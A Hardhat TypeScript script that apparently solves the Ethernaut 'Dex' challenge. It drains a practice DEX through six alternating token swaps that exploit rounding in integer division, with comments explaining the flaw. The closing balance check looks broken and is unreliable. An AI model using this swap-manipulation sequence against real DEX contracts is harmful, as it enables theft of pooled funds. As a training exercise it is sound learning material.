import { ethers } from "hardhat";

const attackDex = async () => {
    // change contract addresses here.
    const dexAddress = "0x10929702D8f5E0720596E87d3567874b37848Ee3";
    const token1Address = "0x85aE05EF06fbAFfaA0BE49ECE835c60569E59f22"; //type "await contract.token1()" in ethernaut console
    const token2Address = "0xf2B9A6A13e103E5b0E028Fd07Cf4d4cf879D3C34"; //type "await contract.token2()" in ethernaut console

    // Don't touch below
    // Vulnerability comes from get_swap_price(). division wont always result in an integer
    // but sometimes a fraction in which does not exist in solidity
    // You may read more on:
    // https://eips.ethereum.org/EIPS/eip-20
    // https://docs.soliditylang.org/en/v0.8.11/types.html#division
    // after swapping several times you'll see that you have more tokens

    // TODO: automate token address getting from contract
    // TODO: fix conslusion below
    // experimental below to get token1 and token2 address
    // const provider = ethers.getDefaultProvider();
    // const token1Address = await provider.getStorageAt(dexAddress, 0);
    // const token2Address = await provider.getStorageAt(dexAddress, 1);
    // console.log(token1Address);
    // console.log(token2Address);
    // const ABI = [
    //     "function token1() public view returns (address);",
    //     "function token2() public view returns (address);",
    // ];
    // const contractAttack = await ethers.getContractAt(ABI, dexAddress);
    // const t1 = await contractAttack.token1();
    // const t2 = await contractAttack.token2();
    // console.log(t1);
    // console.log(t2);

    const ABI = [
        "function approve(address spender, uint amount)",
        "function swap(address from, address to, uint amount)",
        "function balanceOf(address token, address account)",
    ];
    const contractAttack = await ethers.getContractAt(ABI, dexAddress);
    const approve = await contractAttack.approve(dexAddress, 500);
    const approveReceipt = await approve.wait();
    console.log(approveReceipt);
    // sample table below of continous swap
    // DEX       |        player
    // token1 - token2 | token1 - token2
    // ----------------------------------
    //   100     100   |   10      10
    //   110     90    |   0       20
    //   86      110   |   24      0
    //   110     80    |   0       30
    //   69      110   |   41      0
    //   110     45    |   0       65
    //   0       90    |   110     20
    // execution below
    const swap1 = await contractAttack.swap(token1Address, token2Address, 10);
    const swap2 = await contractAttack.swap(token2Address, token1Address, 20);
    const swap3 = await contractAttack.swap(token1Address, token2Address, 24);
    const swap4 = await contractAttack.swap(token2Address, token1Address, 30);
    const swap5 = await contractAttack.swap(token1Address, token2Address, 41);
    const swap6 = await contractAttack.swap(token2Address, token1Address, 45);
    // conslusion check balance
    const token1Balance = await contractAttack
        .balanceOf(token1Address, dexAddress)
        .then((v: any) => v.toString());
    const token1BalanceReceipt = token1Balance.wait(1);
    if (token1BalanceReceipt === "0") {
        console.log("Token1 balance is 0, Level passed! submit to ethernaut");
    } else {
        console.log("Token1 balance is not 0, Level failed! review code above");
    }
};

attackDex()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
